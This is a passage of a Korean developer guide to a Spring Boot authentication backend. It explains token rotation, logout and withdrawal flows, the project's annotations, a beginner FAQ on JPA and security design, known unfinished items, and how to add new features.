| 1 | 서명·만료·`typ=refresh` 확인 → 실패면 **401** |
| 2 | 계정 조회 |
| 3 | 저장된 토큰이 없거나(로그아웃함) 기한이 지났으면 **401** |
| 4 | **저장된 해시와 비교** → 다르면 → **세션 통째로 삭제 후 401** |
| 5 | 탈퇴 회원이면 **403** |
| 6 | 액세스 토큰 + **리프레시 토큰도 새로** 발급 (회전) |
| 7 | `200` + 토큰 2개 |

**4번이 재사용 감지입니다.** 서명은 맞는데 저장된 것과 다르다 = 옛 토큰이 뒤늦게 쓰였다 = 누가 훔쳐 갔을 수 있다 → **진짜 주인까지 끊고 다시 로그인하게 합니다.**

### 4-4. 로그아웃

```
POST /api/auth/logout
Authorization: Bearer eyJ...
```

| # | 무슨 일 |
|---|---|
| 1 | `JwtAuthenticationFilter` 가 토큰을 읽어 `userId` 를 `SecurityContext` 에 담음 |
| 2 | `SecurityConfig` 의 `authenticated()` 통과 (토큰이 없으면 여기서 **401**) |
| 3 | `@AuthenticationPrincipal Long userId` 로 회원 번호를 받음 |
| 4 | `account.clearRefreshToken()` — 해시와 기한을 `null` 로 |
| 5 | `200` + 안내 메시지 |

**액세스 토큰은 여전히 최대 15분간 유효합니다.** 다만 재발급을 못 하므로 그 뒤로는 완전히 끊깁니다.

### 4-5. 회원탈퇴

```
POST /api/auth/withdrawal
Authorization: Bearer eyJ...
{ "password": "nanumi1234!", "reason": "이사 갑니다" }
```

| # | 무슨 일 |
|---|---|
| 1~3 | 로그아웃과 동일 (토큰 확인 → `userId`) |
| 4 | 이미 탈퇴했으면 **403** |
| 5 | **비밀번호 재확인** → 틀리면 **401** |
| 6 | `user.withdraw(사유)` — 상태만 `WITHDRAWN` 으로 (행은 안 지움) |
| 7 | `account.clearRefreshToken()` |
| 8 | `200` + 탈퇴 시각 |

---

## 5. 어노테이션 사전

이 프로젝트에 나오는 어노테이션을 한자리에 모았습니다.

### 스프링 기본

| 어노테이션 | 하는 일 | 이 프로젝트에서 |
|---|---|---|
| `@SpringBootApplication` | 앱 시작점 + 자동 설정 + 컴포넌트 스캔 | `ApiApplication` |
| `@Component` | 이 클래스를 빈으로 등록 | `JwtConfig`, `LoginAttemptService` 등 |
| `@Service` | `@Component` + "비즈니스 로직" 표시 | `AuthService` |
| `@RestController` | `@Controller` + 응답을 JSON 으로 | `AuthController` |
| `@Configuration` | 이 안에 빈 만드는 방법이 있음 | `SecurityConfig`, `JacksonConfig` |
| `@Bean` | 이 메서드가 돌려주는 걸 빈으로 | 필터 체인, CORS 설정 |
| `@ConfigurationProperties` | yml 값을 필드에 자동 주입 | `JwtConfig`, `CorsProperties`, `NanumiPasswordProperties` |
| `@Profile("dev")` | 그 프로필일 때만 빈을 만듦 | H2 콘솔 필터 체인 |
| `@Order` | 여러 개 중 순서 정하기 | 필터 체인 두 개 |
| `@PostConstruct` | 빈이 만들어진 직후 한 번 실행 | 키 읽기, 더미 해시 만들기 |
| `@Transactional` | 트랜잭션으로 묶기 | `AuthService` 전체 |

### 웹 요청 처리

| 어노테이션 | 하는 일 |
|---|---|
| `@RequestMapping("/api/auth")` | 클래스 공통 주소 |
| `@PostMapping("/login")` | `POST` 요청 주소 |
| `@RequestBody` | 요청 본문 JSON → 자바 객체 |
| `@Valid` | **검증 규칙을 실제로 실행** (빠뜨리기 쉬움) |
| `@AuthenticationPrincipal` | 로그인한 사람의 정보를 꺼냄 |
| `@RestControllerAdvice` | 모든 컨트롤러의 예외를 받음 |
| `@ExceptionHandler(X.class)` | X 예외가 오면 이 메서드 실행 |

### JPA

| 어노테이션 | 하는 일 |
|---|---|
| `@Entity` | DB 표와 짝이 되는 클래스 |
| `@Table(name = "users")` | 표 이름, 유니크 제약 |
| `@Id` | 기본키 |
| `@GeneratedValue(IDENTITY)` | DB 가 번호를 자동 발급 |
| `@Column(nullable, length)` | 컬럼 규칙 |
| `@Enumerated(EnumType.STRING)` | **enum 을 이름으로 저장** (숫자로 저장하면 위험) |
| `@OneToOne` / `@JoinColumn` | 표 사이의 관계 |
| `@CreatedDate` / `@LastModifiedDate` | 시각 자동 기록 |
| `@EntityListeners(AuditingEntityListener.class)` | 위 둘을 동작시키는 장치 |
| `@EnableJpaAuditing` | 그 기능 전체를 켜는 스위치 |

### 검증

| 어노테이션 | 하는 일 |
|---|---|
| `@NotBlank` | `null`·빈 문자열·공백만 거절 |
| `@Size(max = 100)` | 길이 제한 |
| `@Constraint(validatedBy = X.class)` | 이 스티커의 검사기 지정 |
| `@Target(ElementType.FIELD)` | 필드에만 붙일 수 있음 |
| `@Retention(RUNTIME)` | 실행 중에도 읽을 수 있게 유지 (**필수**) |

### 롬복

| 어노테이션 | 만들어 주는 것 |
|---|---|
| `@Getter` / `@Setter` | getter / setter |
| `@RequiredArgsConstructor` | **값이 없는 `final` 필드**만 받는 생성자 |
| `@NoArgsConstructor(access = PROTECTED)` | 기본 생성자 (JPA 용) |
| `@Builder` | `A.builder().b(1).build()` |
| `@Slf4j` | `log` 변수 |

---

## 6. 입문자가 자주 막히는 질문

### Q1. `save()` 를 안 불렀는데 왜 DB 에 반영되나요?

**변경 감지(dirty checking)** 때문입니다.

```java
@Transactional
public LogoutResponse logout(Long userId) {
  Account account = accountEntityRepository.findByUser_Id(userId).orElseThrow(...);
  account.clearRefreshToken();     // ← save() 가 없는데도 DB 에 반영됨
  return LogoutResponse.of();
}
```

**어떻게 되는 건가:**

1. `findByUser_Id` 로 조회하면 JPA 가 그 엔티티를 **작업대(영속성 컨텍스트)에 올려 두고**, 처음 값을 따로 복사해 둡니다
2. `clearRefreshToken()` 으로 값이 바뀝니다
3. 트랜잭션이 끝날 때 JPA 가 **처음 값과 지금 값을 비교**해서, 달라진 것만 `UPDATE` 문으로 내보냅니다

**중요한 조건 두 가지:**
- **트랜잭션 안**이어야 합니다 (`@Transactional`)
- **조회해 온 엔티티**여야 합니다. `new` 로 직접 만든 건 작업대에 없으므로 `save()` 가 필요합니다

### Q2. `final` 은 왜 이렇게 많이 붙나요?

**"이건 안 바뀐다"를 컴파일러에게 약속하는 것**입니다.

```java
private final AuthService authService;    // 한 번 정해지면 절대 안 바뀜
```

- 실수로 다른 걸 넣는 코드를 **컴파일 단계에서 막아 줍니다**
- 읽는 사람이 "이 값이 중간에 바뀔까?"를 걱정하지 않아도 됩니다
- 여러 요청이 동시에 처리될 때 안전합니다

### Q3. `record` 와 `class` 는 언제 나눠 쓰나요?

| | `record` | `class` |
|---|---|---|
| 목적 | **값을 담아 나르기** | 값 + **동작** |
| 값 변경 | 불가능 (불변) | 가능 |
| 이 프로젝트 | 모든 DTO | 엔티티, 서비스, 설정 |

엔티티가 `class` 인 이유는 **값이 바뀌어야 하고**(탈퇴, 비밀번호 변경), **동작이 있기** 때문입니다(`isWithdrawn()`).

### Q4. `Optional` 을 왜 쓰나요? `null` 이 편한데요.

`null` 은 **검사를 깜빡해도 컴파일이 됩니다.**

```java
Account account = repository.findByEmail(email);   // null 일 수도 있음
account.getPassword();                             // ← 여기서 NullPointerException
```

`Optional` 은 **꺼내려면 반드시 한 단계를 거쳐야** 합니다.

```java
repository.findByEmail(email)
    .orElseThrow(() -> new CustomException(ErrorCode.USER_NOT_FOUND));
```

| 메서드 | 값이 없을 때 |
|---|---|
| `.orElse(null)` | `null` 을 돌려줌 |
| `.orElseThrow(...)` | 예외를 던짐 |
| `.ifPresent(...)` | 아무것도 안 함 |
| `.isPresent()` | `false` |

### Q5. 왜 계층을 나누나요? 한 파일에 쓰면 안 되나요?

**각각을 따로 테스트할 수 있기 때문**입니다.

- `NanumiPasswordEncoderTest` 는 **스프링도 DB 도 없이** `new` 로 만들어 돌립니다 → 33개가 0.4초
- `LoginAttemptServiceTest` 는 **가짜 시계**를 넣어 "10분 뒤"를 즉시 재현합니다

한 파일에 다 있으면 비밀번호 해싱 하나를 테스트하려고 DB 를 띄워야 합니다.

### Q6. 오류를 왜 자세히 안 알려 주나요?

**자세한 오류는 공격자에게 지도를 그려 주기 때문**입니다.

| 상황 | 자세히 알려 주면 | 이 프로젝트 |
|---|---|---|
| 없는 이메일 | "가입되지 않은 이메일" → **회원 명단을 만들 수 있음** | "이메일 또는 비밀번호가 올바르지 않습니다" |
| 잠금 | "3분 뒤 풀립니다" → **정확히 그때 재개** | 남은 시간 안 알림 |
| 서버 오류 | 스택 추적 → **내부 구조 노출** | "요청을 처리하지 못했습니다" |

**예외는 하나 있습니다 — 입력 검증 오류입니다.** "비밀번호는 8자 이상" 은 사용자가 고쳐야 하므로 알려 줍니다.

### Q7. 인터페이스만 있고 구현이 없는데 어떻게 도나요?

`UserRepository` 얘기입니다. **스프링 데이터 JPA 가 실행 중에 구현체를 만들어 줍니다.**

메서드 **이름을 분석해서** SQL 을 만듭니다.

```
existsByNicknameIgnoreCase
  exists   → SELECT COUNT(*) > 0
  By       → WHERE
  Nickname → nickname =
  IgnoreCase → LOWER() 로 감쌈
```

그래서 **이름을 틀리게 지으면 서버가 뜰 때 터집니다.** (없는 필드 이름을 쓰면 못 만드니까요)

### Q8. 같은 검사를 왜 여러 번 하나요?

이메일 중복을 세 번 막습니다.

```
① 프런트 화면에서     → 빠른 피드백 (하지만 브라우저는 우회 가능)
② AuthService 에서   → 친절한 메시지 (하지만 동시 요청에는 틈이 있음)
③ DB 유니크 제약      → 확실 (하지만 메시지가 불친절)
```

**각각 잘하는 게 다릅니다.** ①은 빠르고, ②는 친절하고, ③은 확실합니다. 한 겹이 뚫려도 다음 겹이 막습니다.

### Q9. 비밀번호를 왜 일부러 느리게 만드나요?

**빠르면 공격자에게 유리하기 때문**입니다.

| 방식 | 로그인 1회 | 공격자가 10억 개 시도 |
|---|---|---|
| SHA-256 한 번 | 0.000001초 | **몇 초** |
| PBKDF2 21만 번 | 0.1초 | **3년** |

사용자는 0.1초를 못 느끼지만, 공격자에게는 넘을 수 없는 벽이 됩니다.

### Q10. 토큰이 두 개인 이유가 뭔가요?

**안전함과 편함을 맞바꾼 결과**입니다.

| | 수명 | 어디 쓰나 | 훔쳐 가면 |
|---|---|---|---|
| 액세스 토큰 | 15분 | API 부를 때마다 | 15분만 악용 가능 |
| 리프레시 토큰 | 14일 | 액세스 토큰 재발급할 때만 | **하지만 한 번 쓰면 회전돼서 들킴** |

하나만 쓴다면:
- **짧게 하면** → 15분마다 다시 로그인해야 함 (불편)
- **길게 하면** → 훔쳐 가면 14일간 악용 (위험)

나눠 두면 **자주 오가는 것은 짧게**, **가끔 쓰는 것은 길게** 할 수 있습니다.

### Q11. 테스트 파일은 어디에 무엇이 있나요?

```
src/test/java/com/nanumi/api/
├── ApiApplicationTests.java                        스프링이 뜨는지만 확인
├── AuthFlowIntegrationTest.java                    가입→로그인→재발급→로그아웃→탈퇴 전 과정
├── security/
│   ├── LoginAttemptServiceTest.java                가짜 시계로 잠금/해제
│   ├── password/NanumiPasswordEncoderTest.java     해시 형식·salt·pepper·재해싱 (33개)
│   └── xss/SanitizingStringDeserializerTest.java   정규화·보이지 않는 문자
└── validation/
    ├── EmailValidatorTest.java
    ├── PasswordValidatorTest.java
    └── SafeTextValidatorTest.java
```

돌리는 방법:

```bash
cd backend/api && ./mvnw test
```

### Q12. 지금 코드에서 아직 안 된 것은 뭔가요?

이 문서를 쓰는 시점 기준으로, **코드에 흔적은 있지만 구현되지 않은 것들**입니다.

| 항목 | 상태 |
|---|---|
| **로그인 비밀번호 길이 상한** | 🐞 **가입은 64자까지 되는데 로그인은 20자까지** — 21자 이상으로 가입한 계정은 로그인 불가 ([3-13](#3-13-dto--주고받는-데이터의-모양) 참고) |
| 비밀번호 변경 기능 | 없음 — 그래서 위 문제에 걸리면 스스로 복구할 방법이 없음 |
| 비밀번호 재확인 필드 | `SignupRequest` 에 메모만 있음 |
| 탈퇴 사유 30일 후 파기 | `User` 주석에만 있고 실행 코드 없음 |
| DB 스키마 관리(Flyway 등) | 운영은 `validate` 라서 **사람이 SQL 을 직접 실행**해야 함 |
| 반복 횟수 상한 검사 | 7자리로 올리면 해시가 84자가 되어 `length = 83` 컬럼에 저장 실패 |
| 프록시 환경 IP 설정 | `forward-headers-strategy` 가 `none` — 배포 형태가 정해지면 다시 봐야 함 |
| 카운터 공용 저장소 | 메모리에만 있어서 서버를 여러 대로 늘리면 따로 셈 |
| 액세스 토큰 즉시 무효화 | 구조상 불가. 수명 15분으로 대신함 |

---

## 부록: 새 기능을 추가할 때 손대는 순서

예를 들어 "닉네임 변경" 기능을 넣는다면:

1. **`dto/request/`** — `NicknameChangeRequest` 만들기 (`@SafeText @ValidNickname`)
2. **`dto/response/`** — 필요하면 응답 DTO
3. **`entity/`** — `User.changeNickname()` 은 **이미 있음**
4. **`repository/`** — `existsByNicknameIgnoreCase` 도 **이미 있음**
5. **`service/`** — `AuthService`(또는 새 `UserService`)에 메서드 추가
6. **`controller/`** — `@PatchMapping` 추가
7. **`exception/ErrorCode`** — 새 오류가 필요하면 추가
8. **테스트** — 서비스 단위 테스트 + 통합 테스트

**보안 관련 주의:**
- 새 주소는 `SecurityConfig` 에서 **자동으로 보호됩니다**(`anyRequest().authenticated()`). 로그인 없이 열어야 할 때만 `permitAll` 에 추가하세요
- 회원이 자유롭게 적는 값에는 **반드시 `@SafeText`** 를 붙이세요
- 엔티티에 `@Setter` 를 붙이지 말고 **의미 있는 메서드**를 만드세요
- 응답에 엔티티를 그대로 담지 말고 **DTO 로 갈아타세요**

---

*이 문서는 `backend/api/src/main` 아래 자바 파일 39개와 `application*.yml` 3개 전체를 기준으로 작성되었습니다.*
*설계 의도를 더 높은 수준에서 보려면 [backend-code-guide.md](./backend-code-guide.md) 를 참고하세요.*
